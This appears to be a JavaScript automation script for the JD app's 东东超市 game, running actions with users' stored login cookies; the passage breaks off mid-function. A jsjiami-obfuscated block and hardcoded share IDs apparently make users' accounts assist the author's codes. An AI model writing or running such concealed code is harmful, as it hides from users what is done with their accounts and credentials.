/*
 * @Author: lxk0301 https://gitee.com/lxk0301
 * @Date: 2020-08-16 18:54:16
 * @Last Modified by: lxk0301
 * @Last Modified time: 2021-3-4 21:22:37
 */
/*
东东超市
活动入口：京东APP首页-京东超市-底部东东超市
Some Functions Modified From https://github.com/Zero-S1/JD_tools/blob/master/JD_superMarket.py
东东超市兑换奖品请使用此脚本 https://gitee.com/lxk0301/jd_scripts/raw/master/jd_blueCoin.js
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
=================QuantumultX==============
[task_local]
#东东超市
11 * * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_superMarket.js, tag=东东超市, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jxc.png, enabled=true
===========Loon===============
[Script]
cron "11 * * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_superMarket.js,tag=东东超市
=======Surge===========
东东超市 = type=cron,cronexp="11 * * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_superMarket.js
==============小火箭=============
东东超市 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_superMarket.js, cronexpr="11 * * * *", timeout=3600, enable=true
 */
const $ = new Env('东东超市');
//Node.js用户请在jdCookie.js处填写京东ck;
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', jdSuperMarketShareArr = [], notify, newShareCodes;
const helpAu = true;//给作者助力 免费拿活动
let jdNotify = true;//用来是否关闭弹窗通知，true表示关闭，false表示开启。
let superMarketUpgrade = true;//自动升级,顺序:解锁升级商品、升级货架,true表示自动升级,false表示关闭自动升级
let businessCircleJump = true;//小于对方300热力值自动更换商圈队伍,true表示运行,false表示禁止
let drawLotteryFlag = false;//是否用500蓝币去抽奖，true表示开启，false表示关闭。默认关闭
let joinPkTeam = true;//是否自动加入PK队伍
let message = '', subTitle;
const JD_API_HOST = 'https://api.m.jd.com/api';

//助力好友分享码
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = []

!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.coincount = 0;//收取了多少个蓝币
      $.coinerr = "";
      $.blueCionTimes = 0;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      //await shareCodesFormat();//格式化助力码
      await jdSuperMarket();
      await showMsg();
      // await businessCircleActivity();
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
async function jdSuperMarket() {
  try {
    await receiveGoldCoin();//收金币
    await businessCircleActivity();//商圈活动
    await receiveBlueCoin();//收蓝币（小费）
    // await receiveLimitProductBlueCoin();//收限时商品的蓝币
    await daySign();//每日签到
    await BeanSign()//
    await doDailyTask();//做日常任务，分享，关注店铺，
    // await help();//商圈助力
    //await smtgQueryPkTask();//做商品PK任务
    await drawLottery();//抽奖功能(招财进宝)
    // await myProductList();//货架
    // await upgrade();//升级货架和商品
    // await manageProduct();
    // await limitTimeProduct();
    await smtg_shopIndex();
    await smtgHome();
    await receiveUserUpgradeBlue();
    await Home();
    await rankVote();
    if (helpAu === true) {
      await helpAuthor();
      await helpAuthor3();
    }
  } catch (e) {
    $.logErr(e)
  }
}
function showMsg() {
  $.log(`【京东账号${$.index}】${$.nickName}\n${message}`);
  jdNotify = $.getdata('jdSuperMarketNotify') ? $.getdata('jdSuperMarketNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    $.msg($.name, subTitle ,`【京东账号${$.index}】${$.nickName}\n${message}`);
  }
}
//抽奖功能(招财进宝)
async function drawLottery() {
  console.log(`\n注意⚠:东东超市抽奖已改版,花费500蓝币抽奖一次,现在脚本默认已关闭抽奖功能\n`);
  drawLotteryFlag = $.getdata('jdSuperMarketLottery') ? $.getdata('jdSuperMarketLottery') : drawLotteryFlag;
  if ($.isNode() && process.env.SUPERMARKET_LOTTERY) {
    drawLotteryFlag = process.env.SUPERMARKET_LOTTERY;
  }
  if (`${drawLotteryFlag}` === 'true') {
    const smtg_lotteryIndexRes = await smtg_lotteryIndex();
    if (smtg_lotteryIndexRes && smtg_lotteryIndexRes.data.bizCode === 0) {
      const { result } = smtg_lotteryIndexRes.data
      if (result.blueCoins > result.costCoins && result.remainedDrawTimes > 0) {
        const drawLotteryRes = await smtg_drawLottery();
        console.log(`\n花费${result.costCoins}蓝币抽奖结果${JSON.stringify(drawLotteryRes)}`);
        await drawLottery();
      } else {
        console.log(`\n抽奖失败:已抽奖或者蓝币不足`);
        console.log(`失败详情：\n现有蓝币:${result.blueCoins},抽奖次数:${result.remainedDrawTimes}`)
      }
    }
  } else {
    console.log(`设置的为不抽奖\n`)
  }
}
async function help() {
  return
  console.log(`\n开始助力好友`);
  for (let code of newShareCodes) {
    if (!code) continue;
    const res = await smtgDoAssistPkTask(code);
    console.log(`助力好友${JSON.stringify(res)}`);
  }
}
async function doDailyTask() {
  const smtgQueryShopTaskRes = await smtgQueryShopTask();
  if (smtgQueryShopTaskRes.code === 0 && smtgQueryShopTaskRes.data.success) {
    const taskList = smtgQueryShopTaskRes.data.result.taskList;
    console.log(`\n日常赚钱任务       完成状态`)
    for (let item of taskList) {
      console.log(` ${item['title'].length < 4 ? item['title']+`\xa0` : item['title'].slice(-4)}         ${item['finishNum'] === item['targetNum'] ? '已完成':'未完成'} ${item['finishNum']}/${item['targetNum']}`)
    }
    for (let item of taskList) {
      //领奖
      if (item.taskStatus === 1 && item.prizeStatus === 1) {
        const res = await smtgObtainShopTaskPrize(item.taskId);
        console.log(`\n领取做完任务的奖励${JSON.stringify(res)}\n`)
      }
      //做任务
      if ((item.type === 1 || item.type === 11) && item.taskStatus === 0) {
        // 分享任务
        const res = await smtgDoShopTask(item.taskId);
        console.log(`${item.subTitle}结果${JSON.stringify(res)}`)
      }
      if (item.type === 2) {
        //逛会场
        if (item.taskStatus === 0) {
          console.log('开始逛会场')
          const itemId = item.content[item.type].itemId;
          const res = await smtgDoShopTask(item.taskId, itemId);
          console.log(`${item.subTitle}结果${JSON.stringify(res)}`);
        }
      }
      if (item.type === 8) {
        //关注店铺
        if (item.taskStatus === 0) {
          console.log('开始关注店铺')
          const itemId = item.content[item.type].itemId;
          const res = await smtgDoShopTask(item.taskId, itemId);
          console.log(`${item.subTitle}结果${JSON.stringify(res)}`);
        }
      }
      if (item.type === 9) {
        //开卡领蓝币任务
        if (item.taskStatus === 0) {
          console.log('开始开卡领蓝币任务')
          const itemId = item.content[item.type].itemId;
          const res = await smtgDoShopTask(item.taskId, itemId);
          console.log(`${item.subTitle}结果${JSON.stringify(res)}`);
        }
      }
      if (item.type === 10) {
        //关注商品领蓝币
        if (item.taskStatus === 0) {
          console.log('关注商品')
          const itemId = item.content[item.type].itemId;
          const res = await smtgDoShopTask(item.taskId, itemId);
          console.log(`${item.subTitle}结果${JSON.stringify(res)}`);
        }
      }
      if ((item.type === 8 || item.type === 2 || item.type === 10) && item.taskStatus === 0) {
        // await doDailyTask();
      }
    }
  }
}
var _0xod8='jsjiami.com.v6',_0x435a=[_0xod8,'C8OsSsKcRA==','AsOISg==','wq7Dkjx7','w4DCiBDCmA==','McOhw5Y6w7rCqw==','FyxD','KCtAGFA=','aF9zwoVnw5LDtl3Chw==','woPkuK3kuZfot4zlu6fDiAtgYk/mn4Tor4zorojms6flpJzotLDDt+KCuu+7suKCm++5jg==','UjXDnzbDkg==','fcOdasKVWg==','EMKbwovCpcOrwolHLA/ChsKPWQ==','LMK5wrfCqVXDusKyBcOOF8KcM8KBPBLDk8OhdsKkwpvCi8KbSMOcw7ZLw6jDoCrDnMOOY8OUGRvCr8KQw7PCo8ODKVbClyN9woFKJ8KCw78yWmjCisKYwpvCsnXCocKcTMKjw4w4w5TDhlrCicK6KcKxIMOTw7NXPGI5w7bDmsOOw53DjsOoNcKZw5poJAnDlsOhGSACwpJlw5JwVGtVw7vCnC3DuhDDnMOcdSzCq3Y0w7HDpsOKwrRBHw7CmMO7acK7wrvDgcKLw5LCj8KPw40gw7LDrXkHUU9Fw5HDjsKfwpEAEmIQwrJTw6vCrcKNw65lw5c7ZBUQOMKrw7YPSmnCgHEiwo/Csg==','w6ArD2nCv8ObR8OhTsOxIgFuwqohWGbCgwtqHyRYw6nDtcKtGGfDvWTDqsOSIsKHCMOAwofDv3hHw5jCrDjCpsKPwp02VF8pdnMBDit/wobDicOJG8OAwp/DrcOkwoIawoQ6RRXCkMOJwqbCn8K8w5c0FcKGAcKAMDbCmhbCocKFw6nCisKHAzAnwpdfwqJrw53CnsO+UngVw4tRFCDCvsK3KBTDlXTCmxw4WWnDrWgoQAY5IMKCw5JMTcKoAgLDusOzUcKWwpsywoExworCmMOVwovCssOFwrhuw5rCl2Vjw5o4wqnDlsKtQzzCn20UE8O5KMOdSSjDhcK7DQ==','aznCo2rCgsKCM8KJbQFRXsO+w59qw4tPwrhPw4jCl8OhXMODw7vDonvCnsO9LMKwwop0DBzCtws2wp/CksKvKXzDuwxnw6jDtsO/SMKtw4pNwrPCp8Ohw5TCj8OFPV/ChMKww71hwrfDuB7Dn1t5e8OLw47Dl8KNNlfDtMOpOz/CqcOaeMOvw7fCslIifTFawqTClE8xc8K3GcKcw44yGj4/w5fCo8K9eVvCmcKzw6pDwphvRX/ChAIFH8KpwrxAwpDCrUp2wqrDnik4w751w7vDh2Edw458w5jCpmXCmil6YFBBfgXChnPDtUZ5w4/DsgtYOsK2bcOdw58lNAXDtQ==','woE1wp8wwrg=','BTgqw4gG','BsOEw48xw6o=','PTjCgUgN','w6dGwoHDpGk=','w6I3eFZ+','G8OKTsKOfg==','F8K8wqLCiH0=','wrJGw5wfVw==','w43CscKqwqV6','w6LCscORw63Cgg==','IcOMw6Y9w7w=','w4rCpwY0Bg==','wpzCsivCucOT','wqLChMKxIsKU','W8OTd8KqZw==','CSJKE1DCgg==','STLDgg==','w58rAQ==','HMOzVcK6bA==','w6RQwpAVXA==','acOxw7o=','w4LCjwDCqx0=','w6VeLA==','wpnCjlMxBcOnw7hewqA=','FUDCocKLUg==','w6crecK1UQ==','ZsOxw7nClg==','EcKkwqLCiVLDpsKk','EHxBCw==','w5VgwrYyYzbDqBnCtyIfwohdFMK+wrUQw58=','w51qwrXDu8K1aWILwp8hEDJ5M8KGVw==','wo5/Mwg1Bw==','UVUmKsKc','w7fCgDfCiC0=','wr/CqhjDhV0=','TQrDjQ/DoA==','CU7CtA==','w45wwqvDscKZcG4XwosyCzQ=','f0p1wo0=','w4HCncO+w5zCq8Oyd17CvE04w7E=','ZeS6ruS7gui0teW7osOOT0kSwrjmn6jorKXor57msa/lpYrotI3Dn+KBiO+4quKBs++6ug==','WgLDojXCjMOfPcK1diBXCw==','worCoxnCrsOldsOrwpMNwqLDs8OIw6UvIMK5w5rDoy/CsENrwr3DsMOrwqF2M1XDtx7CozPCuCrCqMKTwokZSCRww7wQKcKZw6ZFIAw1CHLCjB0FY8K1G8KOCsOoQ8Oew6dEwpgjwrR9BsKJwrgfOsKybcKjMErCuj9bw7QYbDNqXy7Cg8KYw4Z1w7zDrWIeUXfDqsKmwqLDpyDClMOdBQ/CvcKKw6HDgn15MMOAwpkJJBfDpzLDjgvDsFHDs1sfwpcnQzUtKi7CmVRvOMOOTQjCp8KGCsOBD8K0fyVRwrHDugjDgMKgwolnJ8OLwoDCuQLCgV1pfnPDpA==','w5FUMSzCp8KqUUl4QU9XGcOPWFHCr8OTwr/DnhnCjMKraDpPUjvCoEkkSsK9DcO4w5nDqMKBcsOoWsKRPMKzwrbDqsKIw73CpQUGwqpif3fCplFBw5zDn17ClcK1wopEAsO+CjbDvChEwpk5woBjwoxdCQsRNMOnw6hpPsKUw5DDlMOWw6dWwpc2TxTDr8KGw7PCscOTKMKlZsKCE8OewoNPG1NSN8KrOT/CmMKIw6lid2PDqcKEw6bCnko7LwXCvFnCk8KEWlUDK8O2wq/DoFzDizY3YHXDlXXCkmIpwqxFe2HCksKiw6R8KnrCvDYMZlgXw4ojw6U=','TcOMD8O/XnvChwZfw5gEwqTDlBrCnMOIw4XDgnXDk8OTI0LChFN/w5vDtcKBwrpJwqDDi8O7w6/CpRLCg8OmdWs+J348wop/CkQ/YcOYDMK2AcKMK8OBdMOSaQLDgsOIwqbCmW7CgBPCqGfDjcKjAMKswpEvwqZfUMOIaSZwwoTDt3NlUz1cwoNWZjXCvkjDjcKRw6PDh8K2T2Uzw6A/J8OLw4FKGzEWVRDCgcO1w7MMIF9qw4ACwofCkcO/w47CokHCmMKpPlfCoMKmwpIcfcKST0VWecKZLDhCX2LCvMKpw4TDslE4w4PCihvCu8OpXcK1w6HDgsKEwpY+DcKg','LsKXwpbCnmU=','wp0cwpkRwqo=','wofCiCTDuEA=','wqPDsht4wpM=','w70gJWrCiw==','w67CmAozNg==','wqzDnyd1woo=','Mi3DgVTCpg==','w7IveEBcOg==','NMOtw5g=','YcO1w7bCjBXCj1rCusOuw5DCoWY=','w4xQGTjCjg==','TgDDujbCkMOeMcKsei5ODw==','TQ7DojM=','wqvCgSvCt8O1','w65eJy3CpsKdQk92Z1VP','N8Opw5gW','TD7DjMOUXMOiwpU=','wqbDnC8=','6aOW5Y6i6YaY5bqP5om15Yuk','wqPCpAPCicOEdsOnwooNwq/Cs8Oi','w6QvYkU=','HMOCXsKZWBc=','XDLDlcOyWsOwwpXClcKow51TOQ==','44KQ6aOI5Y+A6Ye15biy44GG','w4PChgjCnTQDw60SWcKOw78z','YQxpw4Y=','bh3DuhXDpCw=','IhEqw6sMDcORIsOtw7l/wog=','YsOnR8OPw48=','B8KawqbCmkc=','CNjgLwsjiahmxwtUFi.kcom.vK6Wr=='];(function(_0x435e9c,_0x2c3b15,_0x3fd29c){var _0x15d5aa=function(_0x2845d9,_0xb1eaf8,_0x23b88a,_0x2249c6,_0x329b7f){_0xb1eaf8=_0xb1eaf8>>0x8,_0x329b7f='po';var _0x35c260='shift',_0x2adf61='push';if(_0xb1eaf8<_0x2845d9){while(--_0x2845d9){_0x2249c6=_0x435e9c[_0x35c260]();if(_0xb1eaf8===_0x2845d9){_0xb1eaf8=_0x2249c6;_0x23b88a=_0x435e9c[_0x329b7f+'p']();}else if(_0xb1eaf8&&_0x23b88a['replace'](/[CNgLwhxwtUFkKWr=]/g,'')===_0xb1eaf8){_0x435e9c[_0x2adf61](_0x2249c6);}}_0x435e9c[_0x2adf61](_0x435e9c[_0x35c260]());}return 0x7c478;};return _0x15d5aa(++_0x2c3b15,_0x3fd29c)>>_0x2c3b15^_0x3fd29c;}(_0x435a,0xf0,0xf000));var _0x31f9=function(_0x399ba0,_0x20111a){_0x399ba0=~~'0x'['concat'](_0x399ba0);var _0x25028c=_0x435a[_0x399ba0];if(_0x31f9['zPVvlF']===undefined){(function(){var _0x210516=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x57bbc1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x210516['atob']||(_0x210516['atob']=function(_0x20394a){var _0x2b515a=String(_0x20394a)['replace'](/=+$/,'');for(var _0x1de264=0x0,_0x45341e,_0x202179,_0x2931f0=0x0,_0x25ac2b='';_0x202179=_0x2b515a['charAt'](_0x2931f0++);~_0x202179&&(_0x45341e=_0x1de264%0x4?_0x45341e*0x40+_0x202179:_0x202179,_0x1de264++%0x4)?_0x25ac2b+=String['fromCharCode'](0xff&_0x45341e>>(-0x2*_0x1de264&0x6)):0x0){_0x202179=_0x57bbc1['indexOf'](_0x202179);}return _0x25ac2b;});}());var _0x16faa9=function(_0x52c1b7,_0x20111a){var _0x2b3a74=[],_0x13fedf=0x0,_0x18ee6a,_0x3c0ad7='',_0x40588a='';_0x52c1b7=atob(_0x52c1b7);for(var _0x553635=0x0,_0x37238b=_0x52c1b7['length'];_0x553635<_0x37238b;_0x553635++){_0x40588a+='%'+('00'+_0x52c1b7['charCodeAt'](_0x553635)['toString'](0x10))['slice'](-0x2);}_0x52c1b7=decodeURIComponent(_0x40588a);for(var _0x260892=0x0;_0x260892<0x100;_0x260892++){_0x2b3a74[_0x260892]=_0x260892;}for(_0x260892=0x0;_0x260892<0x100;_0x260892++){_0x13fedf=(_0x13fedf+_0x2b3a74[_0x260892]+_0x20111a['charCodeAt'](_0x260892%_0x20111a['length']))%0x100;_0x18ee6a=_0x2b3a74[_0x260892];_0x2b3a74[_0x260892]=_0x2b3a74[_0x13fedf];_0x2b3a74[_0x13fedf]=_0x18ee6a;}_0x260892=0x0;_0x13fedf=0x0;for(var _0x39df9f=0x0;_0x39df9f<_0x52c1b7['length'];_0x39df9f++){_0x260892=(_0x260892+0x1)%0x100;_0x13fedf=(_0x13fedf+_0x2b3a74[_0x260892])%0x100;_0x18ee6a=_0x2b3a74[_0x260892];_0x2b3a74[_0x260892]=_0x2b3a74[_0x13fedf];_0x2b3a74[_0x13fedf]=_0x18ee6a;_0x3c0ad7+=String['fromCharCode'](_0x52c1b7['charCodeAt'](_0x39df9f)^_0x2b3a74[(_0x2b3a74[_0x260892]+_0x2b3a74[_0x13fedf])%0x100]);}return _0x3c0ad7;};_0x31f9['VDDtgo']=_0x16faa9;_0x31f9['tLHaYD']={};_0x31f9['zPVvlF']=!![];}var _0x4f0f2e=_0x31f9['tLHaYD'][_0x399ba0];if(_0x4f0f2e===undefined){if(_0x31f9['aqllwv']===undefined){_0x31f9['aqllwv']=!![];}_0x25028c=_0x31f9['VDDtgo'](_0x25028c,_0x20111a);_0x31f9['tLHaYD'][_0x399ba0]=_0x25028c;}else{_0x25028c=_0x4f0f2e;}return _0x25028c;};async function receiveGoldCoin(){var _0x4fa25c={'Shdoo':_0x31f9('0','alBx'),'WOeXE':function(_0x41e168,_0x371768,_0x89b5b8){return _0x41e168(_0x371768,_0x89b5b8);},'kKoLG':_0x31f9('1','fXrq'),'iASbk':_0x31f9('2','4l&k'),'EnPfv':_0x31f9('3','dS]p'),'qVbnJ':_0x31f9('4','Th$J'),'pHWak':function(_0x45588d,_0x2886f0){return _0x45588d*_0x2886f0;},'EaRqk':function(_0x48368a,_0x3756da){return _0x48368a(_0x3756da);},'oJDZr':function(_0x27c544,_0x55b6a1){return _0x27c544===_0x55b6a1;},'eKgpp':_0x31f9('5','uuZV')};const _0x862b2c=_0x4fa25c[_0x31f9('6','ipL4')](taskUrl,_0x4fa25c[_0x31f9('7','I*9!')],{'shareId':[_0x4fa25c[_0x31f9('8','jQqE')],_0x4fa25c[_0x31f9('9','kjSm')],_0x4fa25c[_0x31f9('a','9s4C')]][Math[_0x31f9('b','jQqE')](_0x4fa25c[_0x31f9('c','fjoo')](Math[_0x31f9('d','IZeJ')](),0x3))],'channel':'4'});$[_0x31f9('e','tAmR')](_0x862b2c,(_0xcd0230,_0x129b96,_0x6f0d7c)=>{});$[_0x31f9('f','Kk$i')]=await _0x4fa25c[_0x31f9('10','dS]p')](smtgReceiveCoin,{'type':0x0});if($[_0x31f9('11','fXrq')][_0x31f9('12','fXrq')]&&_0x4fa25c[_0x31f9('13','4l&k')]($[_0x31f9('14','dS]p')][_0x31f9('15','tAmR')][_0x31f9('16','O1#j')],0x0)){console[_0x31f9('17','jQqE')](_0x31f9('18','QDli')+$[_0x31f9('19','4l&k')][_0x31f9('1a','IZeJ')][_0x31f9('1b','9XN1')][_0x31f9('1c','O1#j')]);message+=_0x31f9('1d','IZeJ')+$[_0x31f9('1e','V35y')][_0x31f9('1f','1v!Q')][_0x31f9('20','niHx')][_0x31f9('21','QDli')]+'个\x0a';}else{if(_0x4fa25c[_0x31f9('22','g1aj')](_0x4fa25c[_0x31f9('23','uuZV')],_0x4fa25c[_0x31f9('24','9XN1')])){console[_0x31f9('25','9XN1')](''+($[_0x31f9('19','4l&k')][_0x31f9('26','jQqE')]&&$[_0x31f9('f','Kk$i')][_0x31f9('27','V35y')][_0x31f9('28','tAmR')]));}else{console[_0x31f9('29','JVIY')](_0x4fa25c[_0x31f9('2a','JVIY')]);console[_0x31f9('17','jQqE')](JSON[_0x31f9('2b','XM88')](err));}}}function smtgHome(){var _0x2b0b51={'Tnybf':function(_0x3cfac6,_0x5ebf63){return _0x3cfac6(_0x5ebf63);},'KfcyW':_0x31f9('2c','dS]p'),'ULcFc':function(_0xf3db46,_0x4ddbc1){return _0xf3db46===_0x4ddbc1;},'OZgNt':_0x31f9('2d','niHx'),'fgcRm':function(_0x218926,_0xe4ad23){return _0x218926(_0xe4ad23);},'bynrM':function(_0x4ded26,_0x51a247){return _0x4ded26!==_0x51a247;},'umcbJ':_0x31f9('2e','Th$J'),'ZKYUq':function(_0x5843d,_0x4f2c1e,_0x23c3d1){return _0x5843d(_0x4f2c1e,_0x23c3d1);},'DCCUj':_0x31f9('2f','^N7t'),'rDJJu':_0x31f9('30','uuZV'),'Uiniz':_0x31f9('31','kjSm'),'XyDTT':_0x31f9('32','fXrq'),'TIMmh':function(_0x7cea4,_0x4d9e77){return _0x7cea4*_0x4d9e77;},'rTxVX':function(_0x1f9203,_0x41fca2,_0x4dfc90){return _0x1f9203(_0x41fca2,_0x4dfc90);}};return new Promise(_0x19bcc9=>{var _0x50ad87={'ffdRj':_0x2b0b51[_0x31f9('33','ipL4')],'maldN':function(_0x2d0056,_0x4fba72){return _0x2b0b51[_0x31f9('34','QDli')](_0x2d0056,_0x4fba72);},'pXfiX':function(_0x45bb54,_0xf58ee6){return _0x2b0b51[_0x31f9('35','tAmR')](_0x45bb54,_0xf58ee6);},'SiSqZ':_0x2b0b51[_0x31f9('36','yGrB')],'QrDoh':function(_0x580291,_0x2482f9){return _0x2b0b51[_0x31f9('37','#[[S')](_0x580291,_0x2482f9);}};if(_0x2b0b51[_0x31f9('38','IZeJ')](_0x2b0b51[_0x31f9('39','9XN1')],_0x2b0b51[_0x31f9('3a','uuZV')])){_0x2b0b51[_0x31f9('3b','00Qy')](_0x19bcc9,data);}else{const _0x4bebee=_0x2b0b51[_0x31f9('3c','GgY[')](taskUrl,_0x2b0b51[_0x31f9('3d','i&$e')],{'shareId':[_0x2b0b51[_0x31f9('3e','tAmR')],_0x2b0b51[_0x31f9('3f','9s4C')],_0x2b0b51[_0x31f9('40','4l&k')]][Math[_0x31f9('41','#0F!')](_0x2b0b51[_0x31f9('42','Th$J')](Math[_0x31f9('43','JVIY')](),0x3))],'channel':'4'});$[_0x31f9('44','O1#j')](_0x4bebee,(_0x176204,_0x22f68e,_0x3cd660)=>{});$[_0x31f9('45','kjSm')](_0x2b0b51[_0x31f9('46','9XN1')](taskUrl,_0x2b0b51[_0x31f9('47','18kq')],{'channel':'18'}),(_0x509722,_0x52e599,_0x37449c)=>{try{if(_0x509722){console[_0x31f9('48','!8b9')](_0x50ad87[_0x31f9('49','V35y')]);console[_0x31f9('4a','dS]p')](JSON[_0x31f9('4b','*eIx')](_0x509722));}else{_0x37449c=JSON[_0x31f9('4c','nr2f')](_0x37449c);if(_0x50ad87[_0x31f9('4d','v#0&')](_0x37449c[_0x31f9('4e','!8b9')],0x0)&&_0x37449c[_0x31f9('1f','1v!Q')][_0x31f9('4f','uuZV')]){const {result}=_0x37449c[_0x31f9('50','ce1a')];const {shopName,totalBlue,userUpgradeBlueVos,turnoverProgress}=result;$[_0x31f9('51','18kq')]=userUpgradeBlueVos;$[_0x31f9('52','oqIa')]=turnoverProgress;}}}catch(_0x56d7e6){$[_0x31f9('53','Znct')](_0x56d7e6,_0x52e599);}finally{if(_0x50ad87[_0x31f9('54','lXFG')](_0x50ad87[_0x31f9('55','V35y')],_0x50ad87[_0x31f9('56','I*9!')])){_0x50ad87[_0x31f9('57','niHx')](_0x19bcc9,_0x37449c);}else{console[_0x31f9('58','nr2f')](''+($[_0x31f9('59','oqIa')][_0x31f9('5a','XM88')]&&$[_0x31f9('5b','i&$e')][_0x31f9('5a','XM88')][_0x31f9('28','tAmR')]));}}});}});};_0xod8='jsjiami.com.v6';
//领限时商品的蓝币
async function receiveLimitProductBlueCoin() {
  const res = await smtgReceiveCoin({ "type": 1 });
  console.log(`\n限时商品领蓝币结果：[${res.data.bizMsg}]\n`);
  if (res.data.bizCode === 0) {
    message += `【限时商品】获得${res.data.result.receivedBlue}个蓝币\n`;
  }
}
//领蓝币
function receiveBlueCoin(timeout = 0) {
  return new Promise((resolve) => {
    setTimeout( ()=>{
      $.get(taskUrl('smtg_receiveCoin', {"type": 2, "channel": "18"}), async (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东超市: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
          } else {
            data = JSON.parse(data);
            $.data = data;
            if ($.data.data.bizCode !== 0 && $.data.data.bizCode !== 809) {
              $.coinerr = `${$.data.data.bizMsg}`;
              message += `【收取小费】${$.data.data.bizMsg}\n`;
              console.log(`收取蓝币失败：${$.data.data.bizMsg}`)
              return
            }
            if  ($.data.data.bizCode === 0) {
              $.coincount += $.data.data.result.receivedBlue;
              $.blueCionTimes ++;
              console.log(`【京东账号${$.index}】${$.nickName} 第${$.blueCionTimes}次领蓝币成功，获得${$.data.data.result.receivedBlue}个\n`)
              if (!$.data.data.result.isNextReceived) {
                message += `【收取小费】${$.coincount}个\n`;
                return
              }
            }
            await receiveBlueCoin(3000);
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve()
        }
      })
    },timeout)
  })
}
async function daySign() {
  const signDataRes = await smtgSign({"shareId":"QcSH6BqSXysv48bMoRfTBz7VBqc5P6GodDUBAt54d8598XAUtNoGd4xWVuNtVVwNO1dSKcoaY3sX_13Z-b3BoSW1W7NnqD36nZiNuwrtyO-gXbjIlsOBFpgIPMhpiVYKVAaNiHmr2XOJptu14d8uW-UWJtefjG9fUGv0Io7NwAQ","channel":"4"});
  await smtgSign({"shareId":"TBj0jH-x7iMvCMGsHfc839Tfnco6UarNx1r3wZVIzTZiLdWMRrmoocTbXrUOFn0J6UIir16A2PPxF50_Eoo7PW_NQVOiM-3R16jjlT20TNPHpbHnmqZKUDaRajnseEjVb-SYi6DQqlSOioRc27919zXTEB6_llab2CW2aDok36g","channel":"4"});
  if (signDataRes && signDataRes.code === 0) {
    const signList = await smtgSignList();
    if (signList.data.bizCode === 0) {
      $.todayDay = signList.data.result.todayDay;
    }
    if (signDataRes.code === 0 && signDataRes.data.success) {
      message += `【第${$.todayDay}日签到】成功，奖励${signDataRes.data.result.rewardBlue}蓝币\n`
    } else {
      message += `【第${$.todayDay}日签到】${signDataRes.data.bizMsg}\n`
    }
  }
}
async function BeanSign() {
  const beanSignRes = await smtgSign({"channel": "1"});
  if (beanSignRes && beanSignRes.data['bizCode'] === 0) {
    console.log(`每天从指定入口进入游戏,可获得额外奖励:${JSON.stringify(beanSignRes)}`)
  }
}
//每日签到
function smtgSign(body) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_sign', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}

// 商圈活动
async function businessCircleActivity() {
  // console.log(`\n商圈PK奖励,次日商圈大战开始的时候自动领领取\n`)
  joinPkTeam = $.isNode() ? (process.env.JOIN_PK_TEAM ? process.env.JOIN_PK_TEAM : `${joinPkTeam}`) : ($.getdata('JOIN_PK_TEAM') ? $.getdata('JOIN_PK_TEAM') : `${joinPkTeam}`);
  const smtg_getTeamPkDetailInfoRes = await smtg_getTeamPkDetailInfo();
  if (smtg_getTeamPkDetailInfoRes && smtg_getTeamPkDetailInfoRes.data.bizCode === 0) {
    const { joinStatus, pkStatus, inviteCount, inviteCode, currentUserPkInfo, pkUserPkInfo, prizeInfo, pkActivityId, teamId } = smtg_getTeamPkDetailInfoRes.data.result;
    console.log(`\njoinStatus:${joinStatus}`);
    console.log(`pkStatus:${pkStatus}\n`);
    console.log(`pkActivityId:${pkActivityId}\n`);

    if (joinStatus === 0) {
      if (joinPkTeam === 'true') {
        console.log(`\n注：PK会在每天的七点自动随机加入LXK9301创建的队伍\n`)
        await updatePkActivityIdCDN('https://cdn.jsdelivr.net/gh/gitupdate/updateTeam@master/shareCodes/jd_updateTeam.json');
        console.log(`\nupdatePkActivityId[pkActivityId]:::${$.updatePkActivityIdRes && $.updatePkActivityIdRes.pkActivityId}`);
        console.log(`\n京东服务器返回的[pkActivityId] ${pkActivityId}`);
        if ($.updatePkActivityIdRes && ($.updatePkActivityIdRes.pkActivityId === pkActivityId)) {
          await getTeam();
          let Teams = []
